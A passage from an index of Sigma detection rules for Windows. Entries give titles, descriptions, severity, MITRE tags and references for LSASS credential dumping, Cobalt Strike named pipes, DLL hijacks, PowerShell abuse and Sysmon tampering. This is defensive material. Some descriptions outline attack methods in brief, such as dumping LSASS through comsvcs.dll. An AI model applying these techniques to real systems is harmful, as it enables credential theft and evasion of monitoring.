* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_office_dsparse_dll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### Svchost DLL Search Order Hijack
    
    IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\Windows\System32\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services "svchost.exe -k netsvcs" to gain code execution on a remote machine.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_svchost_dll_search_order_hijack.yml
* https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992

    
### Possible Process Hollowing Image Loading
    
    Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_image_load.yml
* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html

    
### WMIC Loading Scripting Libraries
    
    Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc).

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1220
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml
* https://securitydatasets.com/notebooks/small/windows/05_defense_evasion/SDWIN-201017061100.html

* https://twitter.com/dez_/status/986614411711442944

* https://lolbas-project.github.io/lolbas/Binaries/Wmic/

    
### ADFS Database Named Pipe Connection
    
    Detects suspicious local connections via a named pipe to the AD FS configuration database (Windows Internal Database). Used to access information such as the AD FS configuration settings which contains sensitive information used to sign SAML tokens.

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_susp_adfs_namedpipe_connection.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSDBNamedPipeConnection.yaml

* https://o365blog.com/post/adfs/

* https://github.com/Azure/SimuLand

    
### Turla Group Named Pipes
    
    Detects a named pipe used by Turla group samples

    * Level: critical
    * MITRE: attack.g0010
    * MITRE: attack.execution
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_apt_turla_namedpipes.yml
* Internal Research

* https://attack.mitre.org/groups/G0010/

    
### EfsPotato Named Pipe
    
    Detects the pattern of a pipe name as used by the tool EfsPotato

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_efspotato_namedpipe.yml
* https://twitter.com/SBousseaden/status/1429530155291193354?s=20

* https://github.com/zcgonvh/EfsPotato

    
### Malicious Named Pipe
    
    Detects the creation of a named pipe used by known APT malware

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_mal_namedpipes.yml
* https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/

* https://securelist.com/faq-the-projectsauron-apt/75533/

* https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf

* https://www.us-cert.gov/ncas/alerts/TA17-117A

* https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html

* https://thedfirreport.com/2020/06/21/snatch-ransomware/

* https://github.com/RiccardoAncarani/LiquidSnake

* https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity

* https://us-cert.cisa.gov/ncas/analysis-reports/ar19-304a

* https://download.bitdefender.com/resources/files/News/CaseStudies/study/115/Bitdefender-Whitepaper-PAC-A4-en-EN1.pdf

* https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/

* https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/

    
### WMI Event Consumer Created Named Pipe
    
    Detects the WMI Event Consumer service scrcons.exe creating a named pipe

    * Level: high
    * MITRE: attack.t1047
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_susp_wmi_consumer_namedpipe.yml
* https://github.com/RiccardoAncarani/LiquidSnake

    
### T1086 PowerShell Execution
    
    Detects execution of PowerShell

    * Level: informational
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_powershell_execution_pipe.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html

    
### Alternate PowerShell Hosts Pipe
    
    Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_alternate_powershell_hosts_pipe.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html

    
### CobaltStrike Named Pipe Patterns
    
    Detects the creation of a named pipe with a pattern found in CobaltStrike malleable C2 profiles

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_susp_cobaltstrike_pipe_patterns.yml
* https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575

* https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752

    
### Cred Dump-Tools Named Pipes
    
    Detects well-known credential dumping tools execution via specific named pipes

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_cred_dump_tools_named_pipes.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### PsExec Pipes Artifacts
    
    Detecting use PsExec via Pipe Creation/Access to pipes

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_psexec_pipes_artifacts.yml
* https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view

    
### PsExec Tool Execution
    
    Detects PsExec service installation and execution events (service and Sysmon)

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_tool_psexec.yml
* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://jpcertcc.github.io/ToolAnalysisResultSheet

    
### CobaltStrike Named Pipe Pattern Regex
    
    Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike_re.yml
* https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575

* https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752

    
### CobaltStrike Named Pipe
    
    Detects the creation of a named pipe as used by CobaltStrike

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml
* https://twitter.com/d4rksystem/status/1357010969264873472

* https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/

* https://github.com/Neo23x0/sigma/issues/253

* https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/

    
### Browser Credential Store Access
    
    Detects suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing

    * Level: medium
    * MITRE: attack.t1003
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_access/file_access_win_browser_credential_stealing.yml
* https://www.zscaler.com/blogs/security-research/ffdroider-stealer-targeting-social-media-platform-users

* https://github.com/lclevy/firepwd

    
### LSASS Access from Program in Suspicious Folder
    
    Detects process access to LSASS memory with suspicious access flags and from a suspicious folder

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_susp_proc_access_lsass_susp_source.yml
* https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights

* https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow

* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf

    
### UAC Bypass Using WOW64 Logger DLL Hijack
    
    Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe 30)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_uac_bypass_wow64_logger.yml
* https://github.com/hfiref0x/UACME

    
### CobaltStrike BOF Injection Pattern
    
    Detects a typical pattern of a CobaltStrike BOF which inject into other processes

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1106
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_cobaltstrike_bof_injection_pattern.yml
* https://github.com/boku7/injectAmsiBypass

* https://github.com/boku7/spawn

    
### Malware Shellcode in Verclsid Target Process
    
    Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_malware_verclsid_shellcode.yml
* https://twitter.com/JohnLaTwC/status/837743453039534080

    
### LSASS Memory Dump
    
    Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_lsass_memdump.yml
* https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html

* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md

* https://research.splunk.com/endpoint/windows_possible_credential_dumping/

    
### CMSTP Execution Process Access
    
    Detects various indicators of Microsoft Connection Manager Profile Installer execution

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.003
    * MITRE: attack.execution
    * MITRE: attack.t1559.001
    * MITRE: attack.g0069
    * MITRE: attack.g0080
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_cmstp_execution_by_access.yml
* https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/

    
### Lsass Memory Dump via Comsvcs DLL
    
    Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml
* https://twitter.com/shantanukhande/status/1229348874298388484

* https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/

    
### LSASS Access from White-Listed Processes
    
    Detects a possible process memory dump that uses the white-listed filename like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft Defender interference

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_lsass_memdump_evasion.yml
* https://twitter.com/_xpn_/status/1491557187168178176

* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz

* https://twitter.com/mrd0x/status/1460597833917251595

    
### LittleCorporal Generated Maldoc Injection
    
    Detects the process injection of a LittleCorporal generated Maldoc.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.t1055.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_littlecorporal_generated_maldoc.yml
* https://github.com/connormcgarr/LittleCorporal

    
### Direct Syscall of NtOpenProcess
    
    Detects the usage of the direct syscall of NtOpenProcess which might be done from a CobaltStrike BOF.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_direct_syscall_ntopenprocess.yml
* https://medium.com/falconforce/falconfriday-direct-system-calls-and-cobalt-strike-bofs-0xff14-741fa8e1bdd6

    
### Suspicious In-Memory Module Execution
    
    Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display "UNKNOWN" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.

    * Level: low
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.001
    * MITRE: attack.t1055.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_in_memory_assembly_execution.yml
* https://azure.microsoft.com/en-ca/blog/detecting-in-memory-attacks-with-sysmon-and-azure-security-center/

    
### Suspect Svchost Memory Asccess
    
    Detects suspect access to svchost process memory such as that used by Invoke-Phantom to kill the winRM windows event logging service.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_invoke_phantom.yml
* https://github.com/hlldz/Invoke-Phant0m

* https://twitter.com/timbmsft/status/900724491076214784

    
### Suspicious GrantedAccess Flags on LSASS Access
    
    Detects process access to LSASS memory with suspicious access flags

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_susp_proc_access_lsass.yml
* https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights

* https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow

* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf

    
### Credentials Dumping Tools Accessing LSASS Memory
    
    Detects process access LSASS memory which is typical for credentials dumping tools

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    * MITRE: car.2019-04-004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_cred_dump_lsass_access.yml
* https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow

* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf

    
### LSASS Memory Access by Tool Named Dump
    
    Detects a possible process memory dump based on a keyword in the file name of the accessing process

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_lsass_memdump_indicators.yml
* https://twitter.com/_xpn_/status/1491557187168178176

* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz

    
### Rare GrantedAccess Flags on LSASS Access
    
    Detects process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule)

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_rare_proc_access_lsass.yml
* https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights

* https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow

* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf

    
### Credential Dumping by LaZagne
    
    Detects LSASS process access by LaZagne for credential dumping.

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0349
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml
* https://twitter.com/bh4b3sh/status/1303674603819081728

    
### SVCHOST Credential Dump
    
    Detects when a process, such as mimikatz, accesses the memory of svchost to dump credentials

    * Level: critical
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_svchost_cred_dump.yml
    
### Load Undocumented Autoelevated COM Interface
    
    COM interface (EditionUpgradeManager) that is not used by standard executables.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_load_undocumented_autoelevated_com_interface.yml
* https://www.snip2code.com/Snippet/4397378/UAC-bypass-using-EditionUpgradeManager-C/

* https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611

    
### Credential Dumping by Pypykatz
    
    Detects LSASS process access by pypykatz for credential dumping.

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_pypykatz_cred_dump_lsass_access.yml
* https://github.com/skelsec/pypykatz

    
### Shellcode Injection
    
    Detects shellcode injection by Metasploit's migrate and Empire's psinject

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/process_access_win_shellcode_inject_msf_empire.yml
    
### Mimikatz through Windows Remote Management
    
    Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.execution
    * MITRE: attack.t1003.001
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    * MITRE: attack.s0002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_access/proc_access_win_mimikatz_trough_winrm.yml
* https://pentestlab.blog/2018/05/15/lateral-movement-winrm/

    
### Accessing WinAPI in PowerShell for Credentials Dumping
    
    Detects Accessing to lsass.exe by Powershell

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_accessing_winapi_in_powershell_credentials_dumping.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Sysmon Configuration Modification
    
    Someone try to hide from Sysmon

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_config_modification_status.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html

    
### Sysmon Configuration Change
    
    Detects a Sysmon configuration change, which could be the result of a legitimate reconfiguration or someone trying manipulate the configuration

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_config_modification.yml
* https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

    
### Sysmon Configuration Error
    
    Someone try to hide from Sysmon

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_config_modification_error.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html

    
### Sysmon Process Hollowing Detection
    
    Detects when a memory process image does not match the disk image, indicative of process hollowing.

    * Level: high
    * MITRE: attack.process_injection
    * MITRE: attack.t1055.012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_process_hollowing.yml
* https://twitter.com/SecurePeacock/status/1486054048390332423?s=20

* https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/

    
### T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack
    
    Detects a threat actor creating a file named `iertutil.dll` in the `C:\Program Files\Internet Explorer\` directory over the network and loading it for a DCOM InternetExplorer DLL Hijack scenario.

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon/sysmon_dcom_iertutil_dll_hijack.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html

    
### Renamed Powershell Under Powershell Channel
    
    Detects renamed powershell

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_renamed_powershell.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Suspicious Non PowerShell WSMAN COM Provider
    
    Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_wsman_com_provider_no_powershell.yml
* https://twitter.com/chadtilbury/status/1275851297770610688

* https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/

* https://github.com/bohops/WSMan-WinRM

    
### Zip A Folder With PowerShell For Staging In Temp
    
    Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1074.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_susp_zip_compress.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md

    
### Suspicious PowerShell Download
    
    Detects suspicious PowerShell download command

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml
    
### Suspicious XOR Encoded PowerShell Command Line
    
    Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml
    
### Netcat The Powershell Version
    
    Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1095
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_powercat.yml
* https://nmap.org/ncat/

* https://github.com/besimorhino/powercat

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md

    
### Use Get-NetTCPConnection
    
    Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_susp_get_nettcpconnection.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell

    
### PowerShell Downgrade Attack
    
    Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_downgrade_attack.yml
* http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/

    
### Tamper Windows Defender
    
    Attempting to disable scheduled scanning and other parts of windows defender atp.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_tamper_with_windows_defender.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Remote PowerShell Session
    
    Detects remote PowerShell sessions

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_remote_powershell_session.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

    
### Abusable Invoke-ATHRemoteFXvGPUDisablementCommand
    
    RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_susp_athremotefxvgpudisablementcommand.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1

    
### Delete Volume Shadow Copies Via WMI With PowerShell
    
    Shadow Copies deletion using operating systems utilities via PowerShell

    * Level: critical
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_delete_volume_shadow_copies.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md

* https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml

* https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods

    
### PowerShell Called from an Executable Version Mismatch
    
    Detects PowerShell called from an executable by the version mismatch method

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_exe_calling_ps.yml
* https://adsecurity.org/?p=2921

    
### Alternate PowerShell Hosts
    
    Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_classic/posh_pc_alternate_powershell_hosts.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html

    
### Alternate PowerShell Hosts
    
    Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe

